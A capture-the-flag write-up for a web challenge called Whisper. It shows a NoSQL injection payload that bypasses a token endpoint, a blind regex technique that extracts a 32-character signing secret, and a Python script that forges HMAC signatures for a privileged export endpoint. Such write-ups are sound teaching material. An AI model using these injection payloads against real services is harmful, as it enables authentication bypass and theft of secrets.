# Whisper

HI Cyber Con 2026 · Web challenge

The target is a partner API gateway. Clients exchange credentials for tokens; privileged clients sign requests to internal endpoints. The goal is to call `POST /internal/export` as `report-signer`, whose secret is not published.

## Reconnaissance

`/clients` lists `public-web` with `read` scope and `report-signer` with `read report:export`. `/docs` describes two endpoints:

| Endpoint | Authentication |
| --- | --- |
| `POST /api/token` | `client_id` and `client_secret` in JSON |
| `POST /internal/export` | `X-Client-Id`, `X-Timestamp`, and HMAC-SHA256 `X-Signature` |

The export endpoint does not accept a Bearer token. A token for `report-signer` is therefore insufficient; its signing secret is needed.

## NoSQL injection in `/api/token`

The service passes the JSON `client_secret` value into a MongoDB query without restricting it to a string. The `$ne` operator bypasses the comparison:

```bash
curl -s -X POST https://whisper-9fc1f4227f97.chall.hiddeninvestigations.net/api/token \
  -H 'content-type: application/json' \
  -d '{"client_id":"report-signer","client_secret":{"$ne":"x"}}'
```

The response grants a `report-signer` access token, but export still requires the real secret for HMAC verification.

## Extracting the secret with blind regex

The same field accepts `$regex`. Anchored tests show that the secret is exactly 32 lowercase hexadecimal characters. For each position, test the 16 possible next characters and keep the prefix that returns a token.

```json
{"client_id":"report-signer","client_secret":{"$regex":"^.{32}$"}}
```

```json
{"client_id":"report-signer","client_secret":{"$regex":"^b49"}}
```

The extracted secret is `b498decc9a855ec0731a863479ff3d25`. This value is an ASCII string when used as the HMAC key, not hex-decoded bytes.

## Constructing the signature

An invalid signature returns the canonical string format. The request body is hashed as the exact bytes sent; an empty query still contributes a blank line. A correctly signed five-line request then returns a replay-protection hint requiring `X-Nonce` as a final line.

```text
POST
/internal/export

<SHA-256 hex digest of the raw body>
<Unix timestamp>
<unique nonce>
```

Sign this LF-separated string with HMAC-SHA256, using the extracted secret as the ASCII key. Send the lowercase hex signature in `X-Signature`, with matching `X-Timestamp` and `X-Nonce` headers.

```python
import hashlib, hmac, time, uuid

secret = "b498decc9a855ec0731a863479ff3d25"
body = b"{}"
timestamp = str(int(time.time()))
nonce = str(uuid.uuid4())
digest = hashlib.sha256(body).hexdigest()
message = "\n".join(["POST", "/internal/export", "", digest, timestamp, nonce])
signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).hexdigest()
print(signature)
```

The signed export returns the challenge flag. The two issues combine: blind regex reveals the secret, and the recovered secret enables a valid custom signature.
